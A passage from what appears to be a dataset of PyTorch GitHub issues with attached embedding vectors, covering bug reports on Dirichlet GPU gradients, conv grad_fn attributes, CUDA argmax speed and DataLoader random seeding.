 -2.00120322e-02 -2.07262516e-01 -4.21407335e-02 -3.99808809e-02
  1.60018668e-01 -1.82434395e-01 -1.42168537e-01  1.21460795e-01
  5.60254514e-01  3.00041169e-01  7.10596591e-02 -1.02444254e-01
  1.30850822e-01  2.80968770e-02 -3.95737961e-02  1.01401843e-02
 -4.65796702e-02  2.30001718e-01 -2.34204665e-01 -3.36128652e-01
  6.04290329e-02  6.11643195e-02  1.06230512e-01  4.32308257e-01
  1.85251534e-01 -1.43815488e-01 -7.05446154e-02  1.06244527e-01
  4.73753065e-02  2.60991603e-01  4.86710183e-02  1.61117822e-01
  1.08463196e-02  8.80152583e-02 -5.27552128e-01 -5.87808788e-02
 -1.47828266e-01 -5.70797920e-03  7.00551830e-03  2.98263252e-01
 -5.67418486e-02  1.39280379e-01  4.14165437e-01  6.33916408e-02
 -3.77139747e-01  1.90488156e-03 -1.14138111e-01 -3.77346501e-02
  4.92983311e-02  1.49701566e-01 -2.61441350e-01  2.84023225e-01
  3.89031172e-01 -1.24645263e-01 -1.03401050e-01  2.62140445e-02
  1.59498721e-01 -1.08213320e-01 -2.22315863e-02 -4.57787424e-01
  1.82023108e-01  3.90446365e-01  2.04981357e-01  2.47669011e-01
  2.98860848e-01  8.80447477e-02  1.51087850e-01 -2.59488016e-01
  2.71346033e-01  3.71311605e-01 -2.63685167e-01  3.05951476e-01
  3.19422007e-01  3.61696854e-02  1.74716502e-01 -3.23371589e-01
 -3.52340221e-01 -1.15275271e-01 -9.91299283e-03  1.05276659e-01
  3.78793836e-01 -1.04206964e-01 -1.10748574e-01  2.79620945e-01
  1.00464217e-01 -2.65531033e-01  2.22109873e-02 -9.42350999e-02
  4.23119515e-02  4.49308604e-01  1.48491591e-01 -2.53823727e-01
 -1.56605512e-01 -1.63969815e-01  2.10813716e-01  1.23702683e-01
  2.10619122e-01 -4.58584309e-01  5.00718728e-02  1.43145636e-01
  1.74792245e-01  1.50591075e-01 -2.09511817e-01  1.25102475e-01
  9.56272855e-02 -8.37431699e-02  2.32195273e-01 -1.59888230e-02
 -4.88283262e-02 -8.72041732e-02  2.31032446e-02  5.23589730e-01
 -2.23312184e-01  9.01882201e-02 -1.42068475e-01  6.87828287e-02
 -2.37148911e-01 -5.68929091e-02  9.85612497e-02  9.32684541e-02
  1.56242728e-01  3.50688964e-01 -1.64957643e-01 -2.28524148e-01
 -1.35270983e-01  5.54956317e-01  7.15944469e-02 -3.20094496e-01
 -4.98999506e-01 -8.57070908e-02  2.45330364e-01 -2.07426906e-01
 -4.48977828e-01 -6.50197938e-02  4.32479382e-01  2.93048203e-01
  1.39505625e-01 -4.38527130e-02 -1.95786342e-01 -1.34748131e-01
 -1.14835069e-01  2.18951240e-01  5.19187227e-02  4.48863745e-01
  2.37903550e-01  3.00163515e-02  9.46695358e-02  1.71246767e-01
 -2.49606758e-01 -1.22344233e-01 -1.09750509e-01 -2.91149020e-01
 -1.41115859e-01 -3.34956981e-02 -3.13743353e-02 -7.51821697e-02
  4.66195792e-02  5.00790417e-01  3.23764205e-01  5.36140092e-02
 -1.93136901e-01  1.15777999e-01  3.93326283e-01 -8.77903625e-02
  5.81647009e-02 -9.94474143e-02 -1.06293827e-01 -2.83185661e-01
 -1.59793526e-01  3.86265591e-02 -1.68609262e-01 -1.08367145e-01]"
implement dirichlet / beta GPU grad  module: distributions triaged,"## Issue description
`torch.distributions.Beta` and `torch.distributions.Dirichlet` don't allow for backward() calls on the GPU; the CPU versions works fine though. 

```ipython
In [1]: import torch

In [2]: d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requir
   ...: es_grad=True))).rsample()

In [3]: torch.mean(d).backward()

In [4]: d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requir
   ...: es_grad=True).cuda())).rsample()


In [5]: 

In [5]: torch.mean(d).backward()
---------------------------------------------------------------------------
RuntimeError                              Traceback (most recent call last)
<ipython-input-5-d517ed89bac2> in <module>()
----> 1 torch.mean(d).backward()

~/.venv3/lib/python3.6/site-packages/torch/tensor.py in backward(self, gradient, retain_graph, create_graph)
     94                 products. Defaults to ``False``.
     95         """"""
---> 96         torch.autograd.backward(self, gradient, retain_graph, create_graph)
     97 
     98     def register_hook(self, hook):

~/.venv3/lib/python3.6/site-packages/torch/autograd/__init__.py in backward(tensors, grad_tensors, retain_graph, create_graph, grad_variables)
     88     Variable._execution_engine.run_backward(
     89         tensors, grad_tensors, retain_graph, create_graph,
---> 90         allow_unreachable=True)  # allow_unreachable flag
     91 
     92 

~/.venv3/lib/python3.6/site-packages/torch/autograd/function.py in apply(self, *args)
     74 
     75     def apply(self, *args):
---> 76         return self._forward_cls.backward(self, *args)
     77 
     78 

~/.venv3/lib/python3.6/site-packages/torch/autograd/function.py in wrapper(ctx, *args)
    186     def wrapper(ctx, *args):
    187         with torch.no_grad():
--> 188             outputs = fn(ctx, *args)
    189 
    190         if not torch.is_grad_enabled():

~/.venv3/lib/python3.6/site-packages/torch/distributions/dirichlet.py in backward(ctx, grad_output)
     33     def backward(ctx, grad_output):
     34         x, concentration = ctx.saved_tensors
---> 35         return _Dirichlet_backward(x, concentration, grad_output)
     36 
     37 

~/.venv3/lib/python3.6/site-packages/torch/distributions/dirichlet.py in _Dirichlet_backward(x, concentration, grad_output)
     18 def _Dirichlet_backward(x, concentration, grad_output):
     19     total = concentration.sum(-1, True).expand_as(concentration)
---> 20     grad = torch._dirichlet_grad(x, concentration, total)
     21     return grad * (grad_output - (x * grad_output).sum(-1, True))
     22 

RuntimeError: _dirichlet_grad is not implemented for type torch.cuda.FloatTensor

```
Provide a short description.

## Code example

```python
import torch
d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requires_grad=True))).rsample()
torch.mean(d).backward() # works!
d = torch.distributions.Dirichlet(torch.sigmoid(torch.randn(3, 4, requires_grad=True).cuda())).rsample()
torch.mean(d).backward() # throws above exception
```

## System Info

(base) âžœ  /tmp python collect_env.py 
Collecting environment information...
PyTorch version: 0.5.0a0+ddc37d7
Is debug build: No
CUDA used to build PyTorch: 9.2.148

OS: Manjaro Linux
GCC version: (GCC) 8.2.0
CMake version: version 3.11.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 9.2.148
GPU models and configuration: GPU 0: GeForce GTX 1060
Nvidia driver version: 396.54
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] Could not collect
[conda] magma-cuda92              2.3.0                         1    pytorch
[conda] torch                     0.5.0a0+ddc37d7           <pip>
[conda] torchfile                 0.1.0                     <pip>
[conda] torchvision               0.2.1                     <pip>

- PyTorch or Caffe2: pytorch
- How you installed PyTorch (conda, pip, source): source 
- OS: arch
- Python version: 3.7",True,"[-2.29704410e-01 -4.76167873e-02 -9.62574407e-02 -1.71335749e-02
  1.04249880e-01 -2.50068270e-02 -3.15351576e-01  1.19562827e-01
 -3.57806265e-01 -2.07532585e-01  6.13725651e-03  1.19481035e-01
  4.44201007e-02  4.93365191e-02  6.41484857e-02  9.86579359e-02
 -1.59345537e-01 -6.59923442e-03  8.73226300e-03  3.26283686e-02
  3.34983289e-01 -7.06505030e-02 -8.67523253e-02  6.15633605e-03
 -1.87261142e-02  9.47225541e-02 -2.56585598e-01 -2.94631839e-01
  2.34103233e-01  9.09206718e-02  2.30478436e-01  9.53829512e-02
 -3.70037496e-01  9.30052549e-02  1.23382866e-01 -1.87742010e-01
 -3.67364526e-01 -6.30814582e-02 -7.50070810e-02  2.91900307e-01
  2.80505776e-01  2.29511604e-01 -1.87028587e-01  1.39376014e-01
 -2.99892336e-01 -8.85457620e-02 -3.41884419e-02 -2.94711981e-02
 -2.55694777e-01 -1.10415436e-01  1.19139537e-01  1.50949627e-01
 -1.17370382e-01  6.02845065e-02  8.37128516e-03 -1.36508137e-01
 -1.59909964e-01  2.29941942e-02  1.28123552e-01 -1.89977378e-01
  1.50344998e-01  2.37619907e-01 -4.08562243e-01  3.17815505e-02
  6.42849654e-02 -1.13617070e-01 -5.44236451e-02  9.01825801e-02
  6.65597260e-01 -2.47275889e-01 -9.60801244e-02  2.33410671e-02
 -1.87565796e-02 -1.52957998e-03 -5.43828830e-02  1.58057049e-01
 -2.22447291e-01  2.24656433e-01 -1.62946701e-01 -3.52882892e-01
  2.10379101e-02  7.02767074e-02  1.63650185e-01  1.95969880e-01
  9.83353630e-02  2.12728437e-02  2.20534742e-01  3.90509889e-02
  1.77323431e-01  1.81424677e-01  1.91528171e-01 -2.01432053e-02
  1.23860985e-01  1.54913351e-01 -3.17831010e-01  2.50554264e-01
  3.01716477e-01 -2.12344825e-01  9.66973603e-02 -1.39838025e-01
  7.86921754e-02 -4.09802824e-01 -2.36239403e-01  3.05303246e-01
  4.56411019e-02 -3.11174184e-01  1.89627081e-01  2.96338379e-01
 -5.67389131e-02  1.13915410e-02  1.99803650e-01  1.29425392e-01
  1.26474172e-01  1.37529336e-02  2.43470073e-04 -5.52551299e-02
 -2.39754602e-01  2.39773259e-01 -3.10877860e-02  2.92630911e-01
  1.38432279e-01  1.74898505e-01  3.82705867e-01  1.85494706e-01
  3.93920183e-01  2.61064488e-02 -1.14383660e-01 -4.20833230e-02
  1.69052333e-01 -2.57013813e-02  4.69324552e-02 -3.33429500e-02
  3.68992351e-02 -1.09201327e-01  3.81799489e-01  1.76718608e-01
 -1.45793870e-01 -6.74172267e-02 -1.70559585e-01  3.26866925e-01
 -2.19178647e-01  7.34505802e-02 -2.89635390e-01 -9.85096991e-02
 -2.01647691e-02  2.68987894e-01  8.48252047e-03  1.23376489e-01
  1.80418655e-01 -4.45627943e-02 -5.12896180e-02 -1.46127790e-01
 -4.11481678e-01  1.62063479e-01  2.38385908e-02 -4.55307849e-02
  2.36580536e-01  7.19801486e-02  4.60638314e-01 -4.52607349e-02
  1.02569737e-01  2.25716889e-01 -6.71603233e-02 -2.64183879e-02
 -2.66462471e-02 -3.97385992e-02 -1.88827261e-01  3.30321714e-02
 -3.47640932e-01  1.44345358e-01  8.42214972e-02 -2.19756812e-01
 -9.97560024e-02 -1.48979910e-02  3.02057058e-01 -2.02140093e-01
  1.15701720e-01 -3.41159821e-01 -9.84243304e-02  1.41280249e-01
  1.13089919e-01  2.21801654e-01  2.60516882e-01  7.95442685e-02
 -9.03538540e-02 -3.49784195e-02  4.24424052e-01 -1.49149999e-01
 -4.32014763e-01 -7.19162896e-02 -3.30421388e-01 -3.15689981e-01
  1.83997124e-01 -1.01757832e-01 -2.50347674e-01 -1.02056280e-01
 -2.11745538e-02  1.47687167e-01 -7.86255822e-02  3.68197672e-02
 -1.64453000e-01 -6.54155836e-02  1.73120707e-01 -9.27092880e-02
  2.02122509e-01  1.11571580e-01 -6.64124370e-01 -4.21472996e-01
 -6.57493830e-01 -1.24785140e-01 -2.88106978e-01 -1.12364687e-01
 -2.68528052e-02  6.81316257e-02 -4.75400537e-02  4.32481244e-02
 -2.77478993e-02 -2.75978297e-02 -2.36038230e-02 -4.87842085e-03
  1.07911453e-01 -2.06315190e-01 -3.48664857e-02 -2.02890292e-01
 -1.25881612e-01  1.84096824e-02 -2.77632236e-01 -2.19164729e-01
  1.06657743e-01  1.80584937e-01 -3.37445676e-01 -2.68292606e-01
  1.96141660e-01 -4.89232987e-02 -2.11389273e-01  2.87573636e-01
  1.74674004e-01 -1.33312047e-01 -3.59869361e-01  9.22938138e-02
  1.73612148e-01  1.08351409e-01  9.62354839e-02 -2.14180350e-01
 -4.91557181e-01  3.63484919e-01 -2.98370779e-01  3.29223908e-02
 -9.53256935e-02 -4.46617305e-02  2.37029150e-01  2.67640352e-02
 -4.70170751e-02 -6.86951429e-02  4.97302592e-01  7.02865124e-02
 -2.05054164e-01 -3.07976127e-01 -8.37744325e-02  1.83715485e-03
 -5.56639507e-02  2.98166156e-01 -2.33432591e-01  3.82853895e-01
  7.61665255e-02 -7.76673257e-02  1.69555806e-02 -7.89610893e-02
  2.46054053e-01 -8.25977251e-02  5.99002950e-02 -4.01821136e-01
  3.54807019e-01  2.00849742e-01  2.90814023e-02 -1.40970320e-01
  2.06373826e-01 -1.95185959e-01  1.27569139e-01 -3.76246929e-01
  3.00429672e-01  4.10892576e-01 -1.11379370e-01 -3.53701621e-01
  1.80121005e-01 -2.85559297e-01 -6.14842549e-02 -1.93404946e-02
 -4.62255001e-01 -1.83947921e-01 -1.69555515e-01 -7.84190446e-02
  3.43260020e-01  1.10552222e-01 -2.75700718e-01 -1.46420732e-01
  2.95712858e-01  8.16924572e-02  2.40900800e-01  5.98276965e-02
  1.08095780e-01  9.11564082e-02  3.34258109e-01 -1.68608576e-01
 -3.73915315e-01  4.09430005e-02  1.34745657e-01 -1.76197559e-01
  6.89682484e-01 -1.76460788e-01  1.98921740e-01  2.13988163e-02
  8.28527361e-02 -4.10965420e-02 -6.07111715e-02  6.88764378e-02
 -1.08868338e-01  2.41966099e-02  4.46741283e-01  5.08360565e-03
  4.43159282e-01 -6.56541139e-02 -2.35454172e-01  2.75212944e-01
 -1.68164462e-01  5.38454205e-02 -3.21164966e-01  1.96122602e-01
  7.30214939e-02  1.24909312e-01  2.28654176e-01  1.45134494e-01
  3.15977633e-01  1.26337901e-01 -2.51699444e-02 -1.90087557e-02
  1.56808451e-01  4.42043662e-01 -1.57164723e-01 -3.24566424e-01
 -2.89799035e-01  8.03720579e-03  9.80444625e-02 -2.64828175e-01
 -1.57322824e-01  1.48362368e-01  4.08054113e-01 -2.19639301e-01
 -2.65951037e-01  1.24459080e-01 -3.81711535e-02  9.32369288e-03
 -9.75437015e-02  2.22323686e-01  3.50381196e-01  3.56393427e-01
  1.23866268e-01 -4.30979766e-02  2.37238094e-01  3.40904891e-01
 -9.96917486e-02  2.09713951e-01 -1.59965247e-01 -3.41258198e-01
 -1.08029079e-02 -1.09567717e-01 -6.43252283e-02 -7.85894170e-02
  2.79149145e-01  4.44994092e-01 -1.55267820e-01 -7.07409084e-02
 -1.64850131e-01  1.07026428e-01  3.05444241e-01  1.69178452e-02
 -4.66497019e-02 -2.75985658e-01  1.01555698e-01 -2.06105381e-01
  6.00150414e-03 -2.37737969e-03 -6.58347681e-02 -3.20683897e-01]"
"accessing the attributes of grad_fn such as kernel_size, stride feature module: autograd triaged","
## Issue description
Are there any methods to get the conv module input params from the â€˜grad_fnâ€™ in the newest version of pytorch?

in pytorch 0.2, we can get convolution parameters, such as kernel_size, padding, and stride from grad_fn, this way is very useful to convert the trained model to caffe prototxt.
but, in pytorch 0.4, the ThnnConv2DBackward and CudnnConvolutionBackward  do not support this way.

for example,in pytorch version 0.2,

## Code example
modle = nn.Conv2d(in_channels=3 out_channels=32, kernel_size=3,stride=2, padding=1, dilation=1))
y = modle(x)

Then, we can get the input paramâ€™s values like kernel_sizeã€strideã€padding value use y.grad_fn.kernel_sizeï¼Œy.grad_fn.padding,â€¦â€¦

but now, in pytorch 0.4, it report that 
""AttributeError: 'CudnnConvolutionBackward' object has no attribute 'kernel_size'""

cc @ezyang @SsnL @albanD @zou3519 @gqchen",True,"[-0.16254896 -0.16188139 -0.22601628 -0.17838307  0.08063748  0.08682588
  0.07779184  0.09865245 -0.4174919  -0.15905628 -0.03464415 -0.09364945
 -0.09481088  0.09405608 -0.00598451  0.17845401 -0.24956086 -0.02771474
  0.21449102 -0.4567935  -0.00956043  0.2031667  -0.11726968  0.20075437
 -0.05636536  0.01924651 -0.17616495 -0.26896977  0.13620847 -0.02162218
  0.23449615  0.23990569 -0.05133653  0.07782     0.07951212  0.07837307
 -0.14649853 -0.07351249 -0.06326714  0.07854177  0.00467952  0.0491615
 -0.02866144 -0.08424333  0.01865556 -0.24623895 -0.14264767  0.11623267
 -0.2600425   0.10823381  0.02521228 -0.11126556 -0.34569615  0.02230069
  0.10853932  0.1406003   0.04317776  0.00804672 -0.02558951 -0.08706517
 -0.24527876  0.11179342 -0.08194388 -0.0120884  -0.30388996 -0.09044788
 -0.06684963  0.00555145  0.43929082  0.04933256 -0.23952478 -0.1017262
 -0.37311518 -0.1317873   0.15431519  0.32996428 -0.32588574  0.13726078
  0.06611463 -0.28660116  0.10451929  0.44718125  0.17119634 -0.09137593
  0.17632434  0.06448088  0.16727492 -0.02486293  0.02166317  0.2047952
  0.4291541  -0.21658191 -0.2932802   0.31759557  0.09056526  0.36919788
 -0.10244107 -0.29693455  0.16774791 -0.34570456 -0.3978863  -0.18012124
  0.07041153  0.3628265  -0.20505916 -0.14320442  0.16917819  0.32734278
  0.2944546  -0.23858008 -0.09684166 -0.03170278  0.12832364  0.02667256
  0.19134936  0.00733751 -0.18547024  0.03231094  0.2600314   0.11714024
  0.07574449  0.08195367  0.2713576   0.1922149   0.09849574  0.04586671
 -0.03914317 -0.17613302  0.372062    0.09136985  0.31649786  0.1873888
  0.05576736 -0.0588212   0.03651272 -0.060956    0.03699527 -0.04458836
 -0.16003911  0.03198643 -0.24842829 -0.2503245   0.04489494 -0.03614056
  0.0243099   0.0660432  -0.31826     0.09051073  0.0910412   0.02848878
 -0.0085377  -0.10000788 -0.13112013  0.36772513  0.04431925  0.34513214
  0.07548887 -0.10507327  0.10772163 -0.24718945 -0.07628658  0.18734398
  0.00881186 -0.2858125   0.3002172   0.11944911 -0.12340292  0.03492654
  0.09922515  0.01045389  0.13191622 -0.07586212 -0.08249529 -0.17975286
  0.41608977 -0.1636559  -0.04288174 -0.14168611  0.04338615  0.26970714
  0.10949147  0.24170688  0.14539228  0.06157011 -0.00437263  0.15800753
  0.30894023 -0.12750868 -0.18913877  0.27221525  0.05681591 -0.24540438
  0.20343304 -0.292577   -0.2447564  -0.26352483  0.24632381  0.2725159
  0.04387309  0.0978414  -0.14505276 -0.13164523  0.27651    -0.05597942
  0.01897924 -0.05161908 -0.39986867 -0.0165952  -0.19651455  0.18730891
  0.06701644 -0.21753544  0.13062379 -0.2124337  -0.04768777  0.07347576
  0.20738524 -0.19186908 -0.3381993   0.04681135 -0.11976446 -0.08736166
 -0.09662183 -0.10548529  0.05456908  0.05170647 -0.03892329  0.2044508
 -0.04848138  0.1814266   0.07836992  0.0131403   0.34041435  0.04293392
  0.07939203  0.09015695 -0.01250039 -0.1134007   0.04876079  0.18752033
 -0.29111946 -0.00091206 -0.02141141 -0.15849516 -0.12346928 -0.02883477
 -0.14814651 -0.05244273 -0.15914223 -0.20935422  0.01906429 -0.11483692
  0.04363086  0.08681405  0.2644081   0.08923759 -0.11255322  0.1644717
 -0.02987348 -0.17639063  0.24000642  0.16859442 -0.14554563  0.49700433
  0.15870884  0.04136802 -0.05674646 -0.00184477 -0.03045227 -0.12046126
  0.00908842 -0.2935274   0.18700661  0.14555675  0.36081493  0.13804927
  0.00511391 -0.13447817  0.12048556 -0.0664693   0.03663551  0.08553042
 -0.12133716  0.00624885  0.0633869  -0.18682875 -0.21507931 -0.28659898
 -0.15557098 -0.06323335 -0.16856253  0.21574318  0.06982745 -0.07920455
 -0.08765843  0.25822294  0.4178093   0.24130781 -0.21915622 -0.11415735
 -0.04849783  0.0610733   0.08956499 -0.1889335  -0.10522518 -0.1933572
  0.11682062  0.01234328  0.3565366  -0.18341616  0.0271523   0.21348456
  0.13254003  0.13291186 -0.09158079 -0.06355301  0.0392066   0.3547914
  0.1833201   0.01929361 -0.266021   -0.14498568 -0.14476733  0.3560694
  0.01523381  0.36848292 -0.06565641  0.01953531 -0.06663047  0.20408055
  0.18118382  0.07751596 -0.17342184  0.2534756   0.14310345  0.02318184
 -0.02906742  0.25994563  0.04413217 -0.29273155 -0.11164396  0.11185696
  0.04494928 -0.290179   -0.09725684 -0.4039103   0.08788604  0.45935208
 -0.09690741 -0.0284818  -0.25750044  0.13351214 -0.19296741 -0.12064484
  0.02857088  0.40077323  0.0705128  -0.05133536 -0.04484937  0.46511304
 -0.33235604 -0.09703172 -0.16333374 -0.24634331 -0.28855246 -0.13050067
  0.00244448 -0.32233405  0.02830739  0.18096703 -0.03136273  0.17311394
 -0.26267996 -0.06130061  0.08055472  0.14793138 -0.17408875 -0.02982483
  0.055857   -0.27020225 -0.5899497   0.31180817 -0.02789886 -0.19092715]"
Argmax performance slower than numpy high priority module: performance module: cuda triaged,"## Issue description

torch.argmax on a cuda array is slower than transferring to CPU and then calling np.argmax

## Code example

https://gist.github.com/tbenst/de3f61ac9956778a2ca6d5db94b526ef

## System Info
PyTorch version: 0.4.0
Is debug build: No
CUDA used to build PyTorch: 8.0.61

OS: Ubuntu 16.04.4 LTS
GCC version: (GCC) 6.3.0
CMake version: version 3.5.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 9.0.176
GPU models and configuration: GPU 0: GeForce GTX 1070
Nvidia driver version: 384.130
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.5.1.10
/usr/lib/x86_64-linux-gnu/libcudnn.so.7.0.5
/usr/lib/x86_64-linux-gnu/libcudnn_static_v5.a
/usr/lib/x86_64-linux-gnu/libcudnn_static_v7.a

Versions of relevant libraries:
[pip3] numpy (1.14.2)
[pip3] numpydoc (0.7.0)
[pip3] torch (0.4.0)
[pip3] torchvision (0.2.0)
[conda] cuda80                    1.0                           0    soumith
[conda] cuda90                    1.0                  h6433d27_0    pytorch
[conda] pytorch                   0.4.0            py36hd73e86b_0  
[conda] torchvision               0.2.0            py36h17b6947_1    pytorch

",True,"[-2.11848915e-01 -2.81750977e-01 -6.33283019e-01  1.21913321e-01
 -1.91778392e-01 -4.43370908e-01 -4.10845190e-01  1.56153902e-01
 -4.77500796e-01 -2.09647819e-01  2.61777528e-02  2.49765724e-01
 -1.82537153e-01 -4.04406860e-02 -5.01700155e-02  4.91370708e-02
  3.38171482e-01  1.05837181e-01  4.95146811e-02 -2.86631167e-01
 -9.96613652e-02 -1.60439253e-01 -4.29511070e-02 -1.13065138e-01
  3.80767882e-01  5.76699823e-02 -6.56986535e-02 -4.52177823e-01
  1.07068524e-01 -2.07309797e-01  3.92557047e-02  1.14528596e-01
  2.62504101e-01 -9.51410234e-02 -3.11832815e-01 -4.87736128e-02
 -3.62716019e-01 -4.13424551e-01  6.78611994e-02  4.59432229e-02
 -3.30720931e-01  2.06456453e-01 -2.55339779e-02 -1.43661588e-01
 -2.22299844e-01 -2.89362460e-01 -1.20963603e-01  3.87732238e-01
 -2.50438720e-01 -3.58201489e-02  1.27224833e-01  6.35695010e-02
  1.93631738e-01 -2.89474547e-01 -6.31784126e-02 -6.99314289e-04
 -3.34489971e-01  3.98421139e-02 -1.62753344e-01 -7.59254303e-03
  3.70165348e-01 -1.57853961e-01 -3.03381886e-02 -1.27704050e-02
  1.32015735e-01  2.36135036e-01  1.42744318e-01 -8.64746273e-02
  3.19568187e-01 -7.56630749e-02 -2.34748468e-01 -9.17042978e-03
 -2.15618104e-01 -1.87428311e-01  9.67074633e-02  1.35843381e-02
  2.42970362e-01  1.45910950e-02  4.32711914e-02  3.22857425e-02
  3.08587790e-01  1.13623872e-01 -8.78589302e-02 -5.28079391e-01
  2.41485983e-01 -1.42962843e-01  4.12037641e-01  3.07978690e-01
  1.85421221e-02 -5.19883752e-01  4.70937759e-01  5.66461861e-01
 -2.71203309e-01  6.36089921e-01  1.28815264e-01  2.45162323e-01
 -1.69573858e-01 -7.96979219e-02 -2.96905011e-01 -3.12894881e-01
 -1.61547959e-01 -3.57756108e-01 -2.35660598e-01  6.63487911e-01
 -2.38742843e-01 -3.46787870e-01  2.81137228e-01  4.06341672e-01
  2.61151791e-02  2.17912301e-01  3.79503250e-01  2.42076412e-01
 -1.13762796e-01  1.02714866e-01  1.26280755e-01  1.94579601e-01
 -2.69622654e-01 -1.82240158e-02  1.61134750e-01 -1.62536353e-02
  2.25161854e-03 -2.41117124e-02 -7.59401098e-02 -8.08872655e-02
  4.81112123e-01  9.48727578e-02  2.51463771e-01  1.70373708e-01
 -2.05469877e-01  9.55122411e-02  1.19182467e-01 -9.80020389e-02
  1.39189854e-01  1.58298790e-01  1.85522839e-01  2.97823370e-01
 -2.53097981e-01  4.14749235e-02 -1.96166754e-01  3.60309146e-04
 -2.76556969e-01  3.48453224e-01  9.75625440e-02 -2.88075387e-01
  9.14516002e-02  3.99233699e-01 -1.70723170e-01 -6.80928230e-02
  2.35892177e-01  3.41893882e-01 -1.71161637e-01  6.40943497e-02
 -3.51554573e-01  5.95965087e-01  1.20151892e-01  2.33184844e-01
 -2.67255828e-02 -1.06786653e-01  2.20747322e-01 -6.02757037e-01
  2.38184594e-02  3.26710910e-01  2.27577344e-01 -1.31061703e-01
 -1.93213195e-01  1.42181069e-01 -2.12007940e-01 -2.64047444e-01
 -1.63596898e-01  5.72858691e-01 -5.24795532e-01 -3.74503762e-01
  1.54504091e-01 -3.00752848e-01  1.35940388e-01 -1.85808390e-02
 -4.84237552e-01 -2.91775167e-03  1.74354732e-01  3.70267361e-01
 -2.31781393e-01  6.77149177e-01  6.19322300e-01  7.80371875e-02
  1.92620590e-01  2.77116984e-01  5.43461025e-01  1.92544267e-01
 -3.87833029e-01 -3.28907281e-01 -3.36863130e-01 -2.13340163e-01
 -5.17269410e-02 -1.91573173e-01  1.31006211e-01 -6.22599758e-02
  2.01274455e-01  1.40140504e-01  7.52581507e-02 -1.21470585e-01
 -2.92831063e-01  1.27237551e-02  3.30050558e-01  1.99035089e-02
  6.56074807e-02  4.07662541e-02 -2.98576891e-01 -2.37273902e-01
 -1.63674191e-01  6.84390664e-02 -4.64353621e-01 -3.16616774e-01
 -1.39041737e-01 -3.80053483e-02 -4.13876891e-01  4.94763136e-01
  2.75819004e-01  4.16842818e-01 -7.19945580e-02  4.57383364e-01
  3.13390225e-01 -2.20266521e-01  2.84919530e-01 -4.47609186e-01
  3.93432260e-01  3.67697179e-02 -5.25081307e-02  1.99269950e-02
  1.08439289e-01  1.28227128e-02  7.10353488e-03  1.87578022e-01
  3.20843272e-02  9.66272354e-02 -8.67116451e-02  4.74028289e-01
 -2.62565389e-02  4.96151559e-02  3.12821448e-01  3.81451100e-01
 -2.07055002e-01 -2.53309071e-01 -6.94457293e-02 -2.16610327e-01
  3.42287719e-01  5.18327832e-01 -2.36704245e-01 -1.97719306e-01
 -2.21313044e-01  1.99019104e-01  1.15659274e-02 -3.25570464e-01
 -4.39797528e-03 -1.58025622e-01  7.20515177e-02 -2.08594561e-01
  1.01336166e-01 -2.65947953e-02  8.26126486e-02 -3.16952430e-02
  4.14598882e-01  2.18757674e-01 -3.48248750e-01  3.70223969e-01
  1.38766468e-01  1.91023901e-01 -3.93218994e-01  1.49522588e-01
 -2.17655241e-01 -2.70596415e-01  1.15272738e-02 -3.63709033e-01
  1.71008646e-01 -6.79363236e-02  3.52052689e-01 -1.13656474e-02
  5.45386434e-01 -3.97815585e-01  1.49334729e-01 -5.97728752e-02
  1.27997130e-01 -8.20148438e-02  6.47415891e-02  2.46210784e-01
  3.28732997e-01 -4.73587900e-01 -3.65588874e-01 -2.52825022e-01
 -1.95675850e-01 -1.25917032e-01 -2.76121020e-01  1.15159348e-01
  3.89228821e-01  1.48234917e-02 -2.06535310e-01  2.83732116e-01
  2.88580835e-01  2.26142794e-01  7.61485398e-02 -3.79914790e-01
 -5.84615707e-01 -7.07976595e-02 -6.22823983e-02 -3.37557018e-01
 -5.12418509e-01 -3.47408503e-02  1.69930197e-02  2.56697237e-01
  2.76412964e-01 -1.18021563e-01 -2.16230862e-02 -4.95406687e-02
  2.35956125e-02  9.64598730e-02 -3.77753191e-02  1.68151706e-02
  1.94336355e-01  3.96922022e-01  1.37257800e-01 -1.04633063e-01
 -3.69118661e-01 -1.39665514e-01 -4.34959441e-01  3.88643481e-02
  5.26848584e-02  3.53555709e-01 -3.52800339e-01  1.87535852e-01
  3.10806543e-01  3.08407485e-01  3.86524618e-01  1.49242818e-01
  3.69688496e-02  9.64342803e-02 -8.86796862e-02 -4.85558882e-02
  2.86660254e-01 -2.11503312e-01  1.36574924e-01 -3.22433293e-01
 -2.95407593e-01  3.04722339e-01 -1.34874970e-01 -1.21576063e-01
  2.09624618e-02 -1.84859484e-01  3.45118523e-01  5.81806779e-01
 -3.45693938e-02 -2.18579859e-01 -2.62556583e-01  1.80671543e-01
  1.30745709e-01 -1.41949087e-01  1.08969770e-03  3.90511274e-01
  4.32822913e-01  1.76409364e-01  1.68953836e-01  9.84959379e-02
 -9.44689885e-02  1.00436799e-01 -1.04349032e-01 -1.74245872e-02
 -8.54481533e-02 -2.79317021e-01 -1.24390058e-01 -3.51209253e-01
  4.52478379e-02  5.29201962e-02 -3.21575016e-01  1.86700188e-02
 -6.55457675e-02 -2.19417363e-03  4.47985411e-01 -3.10784876e-01
 -1.77400857e-01 -6.91603869e-02  2.58652836e-01  2.75082171e-01
  4.26441021e-02 -1.76871762e-01 -5.07196821e-02 -3.14670652e-02]"
np.random generates the same random numbers for each data batch high priority module: dataloader triaged module: random,"For example, the following script 

```
from __future__ import print_function

import numpy as np
import random

# np.random.seed(0)

class Transform(object):
    def __init__(self):
        pass

    def __call__(self, item = None):
        return [np.random.randint(10000, 20000), random.randint(20000,30000)]

class RandomDataset(object):

    def __init__(self):
        pass

    def __getitem__(self, ind):
        item = [ind, np.random.randint(1, 10000), random.randint(10000, 20000), 0]
        tsfm =Transform()(item)
        return np.array(item + tsfm)
    def __len__(self):
        return 20


from torch.utils.data import DataLoader

ds = RandomDataset()
ds = DataLoader(ds, 10, shuffle=False, num_workers=4)

for batch in ds:
    print(batch)
```

gives 

```
#     0   2208  10983      0  15930  26264
#     1   2798  14403      0  17685  29545
#     2    528  16195      0  12927  28761
#     3   8541  13614      0  15240  24058
#     4   7144  14373      0  18374  28081
#     5   2329  17456      0  15192  26903
#     6    423  12168      0  18504  24193
#     7   9476  12027      0  19924  22325
#     8   3427  17570      0  12895  29773
#     9   6526  13327      0  15768  24566
#[torch.LongTensor of size 10x6]
